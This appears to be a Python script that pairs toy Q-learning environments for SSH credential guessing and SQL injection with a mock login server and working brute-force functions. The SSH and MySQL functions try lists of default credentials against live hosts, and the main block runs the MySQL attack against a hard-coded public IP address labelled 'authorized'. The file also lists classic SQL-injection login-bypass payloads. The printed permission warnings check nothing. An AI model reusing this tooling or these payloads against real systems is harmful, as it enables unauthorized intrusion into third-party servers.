import random
import numpy as np
import warnings
import mysql.connector
from gym import Env
from gym.spaces import Discrete, Box
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import requests
import paramiko
import urllib.parse

# Suppress all warnings
warnings.filterwarnings("ignore", category=Warning)


class SSHBruteForceEnv(Env):
    def __init__(self):
        self.credentials = [
            ("admin", "password"),
            ("root", "toor"),
            ("user", "123456"),
            ("guest", "guest"),
            ("admin", "admin123")
        ]
        self.action_space = Discrete(len(self.credentials))
        self.observation_space = Box(low=0, high=1, shape=(1,))
        self.target_cred = random.choice(self.credentials)
        self.attempts = 0
        self.max_attempts = 10

    def step(self, action):
        self.attempts += 1
        username, password = self.credentials[action]
        reward = 1 if (username, password) == self.target_cred else -0.1
        done = reward == 1 or self.attempts >= self.max_attempts
        return (
            np.array([self.attempts / self.max_attempts]),
            reward,
            done,
            {"username": username, "password": password}
        )

    def reset(self):
        self.attempts = 0
        self.target_cred = random.choice(self.credentials)
        return np.array([0.0])


class SQLInjectionEnv(Env):
    def __init__(self):
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "admin' --",
            "' UNION SELECT NULL --",
            "invalid"
        ]
        self.action_space = Discrete(len(self.payloads))
        self.observation_space = Box(low=0, high=1, shape=(1,))
        self.target_payload = random.choice(self.payloads[:-1])
        self.attempts = 0
        self.max_attempts = 10

    def step(self, action):
        self.attempts += 1
        payload = self.payloads[action]
        reward = 1 if payload == self.target_payload else -0.1
        done = reward == 1 or self.attempts >= self.max_attempts
        return (
            np.array([self.attempts / self.max_attempts]),
            reward,
            done,
            {"payload": payload}
        )

    def reset(self):
        self.attempts = 0
        self.target_payload = random.choice(self.payloads[:-1])
        return np.array([0.0])


class SQLiTestServer(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length).decode("utf-8")
        params = urllib.parse.parse_qs(post_data)
        payload = params.get("username", [""])[0]
        print(f"Received post_data: {post_data}")
        print(f"Parsed payload: {payload}")

        valid_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "admin' --",
            "' UNION SELECT NULL --"
        ]
        if payload in valid_payloads:
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Login successful!")
        else:
            self.send_response(401)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Login failed.")


def run_server(port=8000):
    server_address = ("", port)
    httpd = HTTPServer(server_address, SQLiTestServer)
    print(f"Starting SQLi test server on port {port}...")
    httpd.serve_forever()


def q_learning_exploit(env, episodes=100):
    q_table = np.zeros((10, env.action_space.n))
    alpha = 0.2
    gamma = 0.95
    epsilon = 0.2

    successes = 0
    for episode in range(episodes):
        state = env.reset()
        state_idx = 0
        done = False

        while not done:
            if random.random() < epsilon:
                action = env.action_space.sample()
            else:
                action = np.argmax(q_table[state_idx])

            next_state, reward, done, info = env.step(action)
            next_state_idx = min(int(next_state[0] * 10), 9)

            q_table[state_idx, action] += alpha * (
                reward + gamma * np.max(q_table[next_state_idx]) -
                q_table[state_idx, action]
            )
            state_idx = next_state_idx

            if reward > 0:
                successes += 1
                if isinstance(env, SSHBruteForceEnv):
                    print(
                        f"Episode {episode + 1}: Cracked {info['username']}:"
                        f"{info['password']} in {env.attempts} attempts!"
                    )
                else:
                    print(
                        f"Episode {episode + 1}: Injected {info['payload']} in "
                        f"{env.attempts} attempts!"
                    )
                break

        if done and reward <= 0:
            print(f"Episode {episode + 1}: Failed to exploit.")

    success_rate = successes / episodes * 100
    print(f"Success rate: {success_rate:.2f}%")
    return q_table


def test_sqli_payloads():
    print("Testing SQLi payloads against mock server...")
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "admin' --",
        "' UNION SELECT NULL --",
        "invalid"
    ]
    successes = 0
    for payload in payloads:
        try:
            response = requests.post(
                "http://localhost:8000/login",
                data={"username": payload},
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
            if response.status_code == 200:
                print(f"Payload '{payload}' succeeded!")
                successes += 1
            else:
                print(f"Payload '{payload}' failed.")
        except Exception as e:
            print(f"Payload '{payload}' error: {e}")
    success_rate = successes / len(payloads) * 100
    print(f"SQLi test success rate: {success_rate:.2f}%")


def ssh_brute_force(target="127.0.0.1", port=22):
    print(f"Simulating SSH brute-force on {target}:{port}...")
    print(
        "WARNING: Ensure you have EXPLICIT WRITTEN PERMISSION to test this "
        "target! Port 22 on 5.144.129.200 is closed. Use a local VM (e.g., "
        "Metasploitable) or CTF platforms like Hack The Box or TryHackMe."
    )
    credentials = [
        ("admin", "password"),
        ("root", "toor"),
        ("user", "123456"),
        ("guest", "guest"),
        ("admin", "admin123")
    ]
    successes = 0
    max_attempts = 10
    attempts = 0

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for username, password in credentials:
        if attempts >= max_attempts:
            break
        attempts += 1
        try:
            ssh.connect(target, port, username, password, timeout=5)
            print(f"Cracked {username}:{password} in {attempts} attempts!")
            successes += 1
            ssh.close()
            break
        except Exception as e:
            print(f"Attempt {attempts} with {username}:{password} failed: {e}")

    success_rate = successes / min(attempts, max_attempts) * 100
    print(f"SSH brute-force success rate: {success_rate:.2f}%")
    return successes > 0


def mysql_brute_force(target="5.144.129.200", port=3306):
    print(f"Testing MySQL brute-force on {target}:{port}...")
    print(
        "WARNING: Ensure you have EXPLICIT WRITTEN PERMISSION to test this "
        "target! Unauthorized access is ILLEGAL."
    )
    credentials = [
        ("root", "root"),
        ("admin", "admin"),
        ("mysql", "mysql"),
        ("user", "password"),
        ("guest", "guest")
    ]
    successes = 0
    max_attempts = 10
    attempts = 0

    for username, password in credentials:
        if attempts >= max_attempts:
            break
        attempts += 1
        try:
            conn = mysql.connector.connect(
                host=target,
                port=port,
                user=username,
                password=password,
                database="mysql",
                connection_timeout=5
            )
            print(f"Cracked {username}:{password} in {attempts} attempts!")
            successes += 1
            conn.close()
            break
        except Exception as e:
            print(f"Attempt {attempts} with {username}:{password} failed: {e}")

    success_rate = successes / min(attempts, max_attempts) * 100
    print(f"MySQL brute-force success rate: {success_rate:.2f}%")
    return successes > 0


if __name__ == "__main__":
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()

    print("Simulating SSH brute-force with Q-learning...")
    ssh_env = SSHBruteForceEnv()
    q_learning_exploit(ssh_env)

    print("\nSimulating SQL injection with Q-learning...")
    sql_env = SQLInjectionEnv()
    q_learning_exploit(sql_env)

    print("\nTesting SQLi payloads against mock server...")
    test_sqli_payloads()

    # Disabled real SSH brute-force due to closed port 22 on 5.144.129.200
    # print("\nTesting real SSH brute-force...")
    # ssh_brute_force(target="5.144.129.200")

    print("\nTesting real MySQL brute-force (5.144.129.200, authorized)...")
    mysql_brute_force()